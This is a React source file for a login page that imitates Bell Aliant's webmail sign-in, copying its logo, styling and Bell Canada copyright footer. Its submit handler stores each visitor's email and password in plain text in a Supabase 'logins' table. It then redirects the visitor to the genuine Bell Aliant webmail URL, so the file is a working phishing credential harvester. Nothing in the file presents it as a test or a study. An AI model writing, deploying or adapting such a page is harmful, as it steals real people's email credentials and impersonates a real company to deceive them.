import { useState } from "react";
import Image from "../assets/lg_2.png";
import { supabase } from "../supabaseClient";

const LoginForm = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const onSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Store the form values to Supabase (password stored as plain text per request)
    try {
      const { error } = await supabase
        .from("logins")
        .insert([{ email, password }]);

      if (error) {
        console.error("Supabase insert error:", error);
        alert("Failed to save form data. Check console for details.");
        return;
      }

      // Redirect to Bell Aliant webmail after successful save
      window.location.assign(
        "https://webmail.bellaliant.net/bell/index-rui.jsp?v=3.1.3.59.2-23&domain=ba#/"
      );
    } catch (err) {
      console.error(err);
      alert("An unexpected error occurred while saving the form.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-[70vh] py-8 mt-[35px]">
      <div className="w-full max-w-md mx-auto">
        <div className="flex w-full max-w-md mx-4justify-center items-center">
          <div
            style={{
              minHeight: "540px",
                position: "relative",
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
              padding: "45px",
              maxWidth: "400px",
              width: "100%",
              marginLeft: "auto",
              marginRight: "auto",
              height: "auto",
              backgroundColor: "#fff",
              border: "solid 1px #d4d4d4",
              boxShadow:
                "0 20px 25px -5px rgba(0, 0, 0, .1), 0 8px 10px -6px rgba(0, 0, 0, .1)",
              borderRadius: "10px",
              overflow: "hidden",
            }}
          >
            <img
              src={Image}
              alt="Bell Aliant Logo"
              className="w-[100px] mb-[30px]"
            />
            <h2
              className=""
              style={{
                fontFamily: "Arial",
                color: "#111",
                letterSpacing: "0",
                fontWeight: 700,
                fontSize: "20px",
                lineHeight: "22px",
              }}
            >
            {/* Loader overlay shown while submitting */}
            {isSubmitting && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "rgba(255,255,255,0.85)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  zIndex: 50,
                }}
              >
                <div aria-hidden="true">
                  <div className="loader" />
                </div>
              </div>
            )}

            {/* Loader CSS */}
            <style>{`
.loader {
  width: 60px;
  aspect-ratio: 4;
  --_g: no-repeat radial-gradient(circle closest-side,#000 90%,#0000);
  background: 
    var(--_g) 0%   50%,
    var(--_g) 50%  50%,
    var(--_g) 100% 50%;
  background-size: calc(100%/3) 100%;
  animation: l7 1s infinite linear;
}
@keyframes l7 {
    33%{background-size:calc(100%/3) 0%  ,calc(100%/3) 100%,calc(100%/3) 100%}
    50%{background-size:calc(100%/3) 100%,calc(100%/3) 0%  ,calc(100%/3) 100%}
    66%{background-size:calc(100%/3) 100%,calc(100%/3) 100%,calc(100%/3) 0%  }
}
`}</style>
              Log in to Bell Aliant email
            </h2>

            <form onSubmit={onSubmit} className="space-y-4 mt-[30px]">
              <div>
                <label className="sr-only">Email address</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  onFocus={(e) =>
                    (e.currentTarget.style.border = "solid 2px #00549A")
                  }
                  onBlur={(e) =>
                    (e.currentTarget.style.border = "1px solid #8D8D8D")
                  }
                  placeholder="Email address"
                  className="focus:outline-none"
                  style={{
                    width: "100%",
                    borderRadius: "4px",
                    backgroundColor: "#fff",
                    border: "1px solid #8D8D8D",
                    padding: "16.5px 20px",
                    fontSize: "16px",
                    lineHeight: "23px",
                    minHeight: "54px",
                    color: "#555555",
                  }}
                  required
                />
              </div>

              <div>
                <label className="sr-only">Password</label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  onFocus={(e) =>
                    (e.currentTarget.style.border = "solid 2px #00549A")
                  }
                  onBlur={(e) =>
                    (e.currentTarget.style.border = "1px solid #8D8D8D")
                  }
                  className="focus:outline-none"
                  style={{
                    width: "100%",
                    borderRadius: "4px",
                    backgroundColor: "#fff",
                    border: "1px solid #8D8D8D",
                    padding: "16.5px 20px",
                    fontSize: "16px",
                    lineHeight: "23px",
                    minHeight: "54px",
                    color: "#555555",
                  }}
                  required
                />
              </div>

              <div>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  aria-busy={isSubmitting}
                  style={
                    isSubmitting
                      ? {
                          backgroundColor: "#7aa6d6",
                          borderColor: "#7aa6d6",
                          borderRadius: "24px",
                          color: "#FFFFFF",
                          width: "100%",
                          height: "52px",
                          fontSize: "16px",
                          lineHeight: "16px",
                          borderWidth: "2px",
                          borderStyle: "solid",
                          opacity: 0.85,
                        }
                      : {
                          backgroundColor: "#003778",
                          borderColor: "#003778",
                          borderRadius: "24px",
                          color: "#FFFFFF",
                          width: "100%",
                          height: "52px",
                          fontSize: "16px",
                          lineHeight: "16px",
                          borderWidth: "2px",
                          borderStyle: "solid",
                        }
                  }
                  className={isSubmitting ? "cursor-not-allowed" : ""}
                >
                  {isSubmitting ? "Submitting..." : "Log in"}
                </button>
              </div>
            </form>

            <div className="mt-6 text-left">
              <a
                href="#"
                className="text-sm block mb-1 text-[18px]"
                style={{
                  textDecoration: "underline",
                  color: "#00549a",
                  fontWeight: 700,
                }}
              >
                Forgot password ›
              </a>
              <a
                href="#"
                className="text-sm text-[18px]"
                style={{
                  textDecoration: "underline",
                  color: "#00549a",
                  fontWeight: 700,
                }}
              >
                Forgot Email address ›
              </a>
            </div>
          </div>
        </div>
      </div>
      <div className="">
        <footer
          className="modal-footer mt-8 text-xs px-20"
          style={{
            backgroundColor: "#f4f4f4",
            fontFamily: "Arial, Helvetica, sans-serif",
            paddingTop: "30px",
            justifyContent: "flex-start",
            display: "flex",
            flexDirection: "column",
            alignItems: "flex-start",
          }}
        >
          <div
            className="mb-3 flex items-center justify-start text-[#0066a4] gap-3"
            style={{
              maxWidth: "1200px",
              width: "100%",
              borderTop: "1px solid #e1e1e1",
              paddingTop: "25px",
            }}
          >
            <a href="#" className="hover:underline">
              Privacy
            </a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">
              Security
            </a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">
              Legal and Regulatory
            </a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline">
              Wireless Code
            </a>
          </div>

          <div className="text-gray-600 flex items-center justify-start gap-2">
            <div>© Bell Canada, 2025. All rights reserved.</div>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default LoginForm;
